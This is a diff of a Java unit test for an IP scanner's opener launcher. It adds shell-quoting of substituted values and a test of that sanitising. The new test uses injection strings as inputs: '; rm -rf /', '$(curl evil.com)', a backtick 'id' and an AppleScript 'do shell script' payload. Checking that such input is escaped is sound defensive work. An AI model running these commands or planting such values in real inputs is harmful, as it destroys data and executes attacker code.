@@ -27,7 +27,6 @@ import static org.mockito.Mockito.when;
  * @author Anton Keks
  */
 public class OpenerLauncherTest {
-
 	@Test
 	public void testReplaceValues() throws UnknownHostException {
 		var fetcherRegistry = mock(FetcherRegistry.class);
@@ -48,13 +47,19 @@ public class OpenerLauncherTest {
 
 		var ol = new OpenerLauncher(fetcherRegistry, scanningResults);
 		
-		assertEquals("\\\\127.0.0.1", ol.prepareOpenerStringForItem("\\\\${fetcher.ip}", 0));
-		assertEquals("HOSTNAME$$$127.0.0.1xxx${}", ol.prepareOpenerStringForItem("${fetcher.hostname}$$$${fetcher.ip}xxx${}", 0));
-		assertEquals("http://127.0.0.1:80/www", ol.prepareOpenerStringForItem("http://${fetcher.ip}:80/www", 0));
-		assertEquals(result.getValues().get(2) + ", xx", ol.prepareOpenerStringForItem("${fetcher.ping}, xx", 0));
+		// sanitize=false: raw substitution (used for URL openers)
+		assertEquals("\\\\127.0.0.1", ol.prepareOpenerStringForItem("\\\\${fetcher.ip}", 0, false));
+		assertEquals("HOSTNAME$$$127.0.0.1xxx${}", ol.prepareOpenerStringForItem("${fetcher.hostname}$$$${fetcher.ip}xxx${}", 0, false));
+		assertEquals("http://127.0.0.1:80/www", ol.prepareOpenerStringForItem("http://${fetcher.ip}:80/www", 0, false));
+		assertEquals(result.getValues().get(2) + ", xx", ol.prepareOpenerStringForItem("${fetcher.ping}, xx", 0, false));
+
+		// sanitize=true: values wrapped in single quotes (used for shell openers)
+		assertEquals("\\\\'127.0.0.1'", ol.prepareOpenerStringForItem("\\\\${fetcher.ip}", 0, true));
+		assertEquals("'HOSTNAME'$$$'127.0.0.1'xxx${}", ol.prepareOpenerStringForItem("${fetcher.hostname}$$$${fetcher.ip}xxx${}", 0, true));
+		assertEquals("http://'127.0.0.1':80/www", ol.prepareOpenerStringForItem("http://${fetcher.ip}:80/www", 0, true));
 				
 		try {
-			ol.prepareOpenerStringForItem("${noSuchFetcher}", 0);
+			ol.prepareOpenerStringForItem("${noSuchFetcher}", 0, false);
 			fail();
 		}
 		catch (UserErrorException e) {
@@ -62,7 +67,7 @@ public class OpenerLauncherTest {
 		}
 
 		try {
-			ol.prepareOpenerStringForItem("${fetcher.comment}", 0);
+			ol.prepareOpenerStringForItem("${fetcher.comment}", 0, false);
 			fail();
 		}
 		catch (UserErrorException e) {
@@ -71,7 +76,7 @@ public class OpenerLauncherTest {
 
 		try {
 			result.setValue(3, NotAvailable.VALUE);
-			ol.prepareOpenerStringForItem("${fetcher.comment}", 0);
+			ol.prepareOpenerStringForItem("${fetcher.comment}", 0, false);
 			fail();
 		}
 		catch (UserErrorException e) {
@@ -79,11 +84,37 @@ public class OpenerLauncherTest {
 		}
 		
 		result.setValue(1, null);
-		assertEquals("Hostname opening should fall back to the IP", "127.0.0.1", ol.prepareOpenerStringForItem("${" + HostnameFetcher.ID + "}", 0));
+		assertEquals("Hostname opening should fall back to the IP", "127.0.0.1", ol.prepareOpenerStringForItem("${" + HostnameFetcher.ID + "}", 0, false));
+		assertEquals("Hostname opening should fall back to the IP", "'127.0.0.1'", ol.prepareOpenerStringForItem("${" + HostnameFetcher.ID + "}", 0, true));
 		result.setValue(1, NotAvailable.VALUE);
-		assertEquals("Hostname opening should fall back to the IP", "127.0.0.1", ol.prepareOpenerStringForItem("${" + HostnameFetcher.ID + "}", 0));
+		assertEquals("Hostname opening should fall back to the IP", "127.0.0.1", ol.prepareOpenerStringForItem("${" + HostnameFetcher.ID + "}", 0, false));
 	}
 	
+	@Test
+	public void testSanitizeForShell() {
+		// normal values are wrapped in single quotes
+		assertEquals("'hostname'", OpenerLauncher.sanitizeForShell("hostname"));
+		assertEquals("'192.168.1.1'", OpenerLauncher.sanitizeForShell("192.168.1.1"));
+
+		// empty value
+		assertEquals("''", OpenerLauncher.sanitizeForShell(""));
+
+		// single quotes inside the value are escaped
+		assertEquals("'it'\\''s'", OpenerLauncher.sanitizeForShell("it's"));
+
+		// shell metacharacters are neutralized inside single quotes
+		assertEquals("'; rm -rf /'", OpenerLauncher.sanitizeForShell("; rm -rf /"));
+		assertEquals("'$(curl evil.com)'", OpenerLauncher.sanitizeForShell("$(curl evil.com)"));
+		assertEquals("'`id`'", OpenerLauncher.sanitizeForShell("`id`")); // backticks are literal inside ''
+		assertEquals("'a|b&c>d<e'", OpenerLauncher.sanitizeForShell("a|b&c>d<e"));
+
+		// Windows cmd metacharacters are also neutralized
+		assertEquals("'a&b|c>d^e%'", OpenerLauncher.sanitizeForShell("a&b|c>d^e%"));
+
+		// AppleScript injection attempt
+		assertEquals("'\" & do shell script \"evil\" & \"'", OpenerLauncher.sanitizeForShell("\" & do shell script \"evil\" & \""));
+	}
+
 	@Test
 	public void testCommandSplitting() throws Exception {
 		assertArrayEquals(new String[] {"hello", "world"}, OpenerLauncher.splitCommand("hello world"));
